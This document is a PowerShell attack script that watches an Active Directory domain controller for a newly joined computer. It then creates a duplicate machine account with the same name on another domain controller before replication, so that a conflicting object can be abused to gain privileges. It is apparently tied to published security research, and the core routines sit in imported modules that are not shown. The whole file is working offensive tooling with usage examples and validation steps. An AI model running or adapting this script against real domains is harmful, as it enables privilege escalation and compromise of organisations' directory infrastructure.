<#
.SYNOPSIS
Dynamically duplicate a new computer joining the domain to create a conflicting object.
.DESCRIPTION
This script is listening to the PDC emulator domain controller and wait for the creation of a new computer.
As soon as a new computer is joining the domain, it will try to create as soon as possible another machine
account having the same name on another domain controller before the effective replication.
.PARAMETER Username
AD account username to use to authenticate.
.PARAMETER Password
AD account password to use to authenticate.
.PARAMETER SourceDomainController
[Optional] Server to monitor, better to target the PDC emulator domain controller (default choice).
.PARAMETER TargetDomainController
[Optional] Server to use to add the CNF object (any other than SourceDomainController will be selected).
.PARAMETER DurationMinutes
[Optional] Timeout.
.EXAMPLE
./Invoke-CnfMachineCreation.ps1 -Username 'user1' -Password 'Super$ecure1'

Subscribe to the SourceDomainController (PDC emulator if empty) using the credentials (for 2 minutes) and duplicate the next computer that
will be added to the domain by targeting TargetDomainController (another domain controller than the PDC emulator if empty).
.EXAMPLE
./Invoke-CnfMachineCreation.ps1 -Username 'user1' -Password 'Super$ecure1' -SourceDomainController 192.168.1.1

Subscribe to the 192.168.1.1 domain controller using the credentials (for 2 minutes) and duplicate the next computer that
will be added to the domain.
.EXAMPLE
./Invoke-CnfMachineCreation.ps1 -Username 'user1' -Password 'Super$ecure1' -SourceDomainController 192.168.1.1 -TargetDomainController 192.168.1.2 -DurationMinutes 30

Subscribe to the 192.168.1.1 domain controller using the credentials (for 30 minutes) and duplicate the next computer that
will be added to the domain by targeting the 192.168.1.2 domain controller.
.NOTES
# Related to https://medium.com/tenable-techblog/using-conflicting-objects-in-active-directory-to-gain-privileges-243ef6a27928
#>

[CmdletBinding()]
param (
    [Parameter(Mandatory = $true)]
    [string]
    $Username,

    [Parameter(Mandatory = $true)]
    [string]
    $Password,

    [Parameter(Mandatory = $false)]
    [string]
    $SourceDomainController = $null,

    [Parameter(Mandatory = $false)]
    [string]
    $TargetDomainController = $null,

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 60)]
    [int] $DurationMinutes = 2
)

# Import modules
$scriptDir = Split-Path -Path $MyInvocation.MyCommand.Definition -Parent

try {
    Import-module -Force $(Join-Path -Path $scriptDir -ChildPath "Invoke-CnfMachineCreation.psm1") -NoClobber -ErrorAction Stop
    Import-Module -Force $(Join-Path -Path $scriptDir -ChildPath "Powermad\Powermad.psm1") -NoClobber -ErrorAction Stop
    Import-Module -Name ActiveDirectory -ErrorAction Stop
} catch {
    Write-Error "One module cannot be imported.`nValidate that Active Directory module is installed, and all the project files are in the same folder."
    exit 1
}

# Variables
$secureStringPassword = ConvertTo-SecureString $Password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($Username, $secureStringPassword)

## Find the PDC emulator domain controller if no input
If (-not $SourceDomainController) {
    $pdceName = (Get-ADDomain).PDCEmulator
    $SourceDomainController = (Resolve-DnsName -Name $pdceName).IPAddress
    Write-Debug "[$(Get-Date)][Main] PDCe name: $pdceName"
    Write-Debug "[$(Get-Date)][Main] PDCe IP address: $SourceDomainController"
}

# Listen and duplicate the next new computer (Step 1 and Step 2)
$CnfMachineName = Start-LdapListener -Server $SourceDomainController -TargetDomainController $TargetDomainController -Credential $Credential -DurationMinutes $DurationMinutes

## Ensure the fake object has noot been identified as CNF (check Step 2 [1/2])
If (-not (Test-FakeObjectWithoutCnf -CnfMachineName $CnfMachineName)) {
    exit 2
}

## Ensure the sAMAccountNAme of fake object has noot been renamed as $DUPLICATE-xxx (check Step 2 [2/2])
If (-not (Test-FakeObjectWithoutDuplicate -CnfMachineName $CnfMachineName)) {
    exit 3
}
